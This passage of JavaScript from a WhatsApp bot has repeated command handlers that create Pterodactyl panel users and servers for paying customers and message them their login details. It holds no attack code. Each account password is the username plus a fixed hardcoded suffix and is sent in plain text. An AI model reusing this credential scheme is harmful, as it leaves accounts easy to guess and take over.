let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: idsal,
newsletterName: wm,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp3gb': 
case '3gb':
case 'panel3gb': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender: t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net': m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "3050"
let cpu = "90"
let disk = "3050"
let email = username + "@gmail.com"
let password = username + "38d8e"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: idsal,
newsletterName: wm,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp4gb': 
case '4gb':
case 'panel4gb': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender: t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net': m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "4050"
let cpu = "120"
let disk = "4050"
let email = username + "@gmail.com"
let password = username + "72bdd9"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: idsal,
newsletterName: wm,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp5gb': 
case '5gb':
case 'panel5gb': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender: t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net': m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "5050"
let cpu = "150"
let disk = "5050"
let email = username + "@gmail.com"
let password = username + "38su4"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: idsal,
newsletterName: `${ownername}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp6gb': 
case '6gb':
case 'panel6gb': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender: t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net': m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "6100"
let cpu = "180"
let disk = "6100"
let email = username + "@gmail.com"
let password = username + "72bdd9"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: wm,
newsletterName: `${ownername}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp7gb': 
case '7gb':
case 'panel7gb': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender: t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net': m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "7100"
let cpu = "210"
let disk = "7100"
let email = username + "@gmail.com"
let password = username + "72bdd9"
if (!u) return
